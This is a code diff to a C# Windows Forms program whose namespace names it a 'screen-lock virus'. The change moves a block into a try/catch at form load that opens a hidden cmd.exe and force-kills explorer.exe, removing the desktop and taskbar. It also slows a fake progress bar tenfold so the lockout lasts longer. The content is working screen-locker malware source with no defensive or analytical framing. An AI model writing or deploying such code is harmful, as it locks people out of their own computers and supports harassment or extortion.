@@ -26,23 +26,29 @@ namespace 锁机病毒
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            try
+            {
+                //杀死explorer
+                Process process_CMD = new Process();
+                process_CMD.StartInfo.FileName = "cmd.exe";//进程打开文件名为“cmd”
+                process_CMD.StartInfo.RedirectStandardInput = true;//是否可以输入
+                process_CMD.StartInfo.RedirectStandardOutput = true;//是否可以输出
+                process_CMD.StartInfo.CreateNoWindow = true;//不创建窗体 也就是隐藏窗体
+                process_CMD.StartInfo.UseShellExecute = false;//是否使用系统shell执行，否
+
+                process_CMD.Start();
+
+                process_CMD.StandardInput.WriteLine("taskkill /im explorer.exe /t /f ");
+            }
+            catch(Exception ex)
+            {
+                //错误处理
+            }
+
             // 创建一个新的线程并开始执行
+            //进度条
             Thread thread = new Thread(new ThreadStart(WorkerThread));
             thread.Start();
-
-            //杀死explorer
-            Process process_CMD = new Process();
-            process_CMD.StartInfo.FileName = "cmd.exe";//进程打开文件名为“cmd”
-            process_CMD.StartInfo.RedirectStandardInput = true;//是否可以输入
-            process_CMD.StartInfo.RedirectStandardOutput = true;//是否可以输出
-            process_CMD.StartInfo.CreateNoWindow = true;//不创建窗体 也就是隐藏窗体
-            process_CMD.StartInfo.UseShellExecute = false;//是否使用系统shell执行，否
-
-            process_CMD.Start();
-
-            process_CMD.StandardInput.WriteLine("taskkill /im explorer.exe /t /f ");
-
-
         }
 
         private void timer1_Tick(object sender, EventArgs e)
@@ -54,7 +60,7 @@ namespace 锁机病毒
         {
             for (int i = 0; i < 100; i++)
             {
-                Thread.Sleep(1000);
+                Thread.Sleep(10000);
                 progressBar1.Value = i;
             }
         }
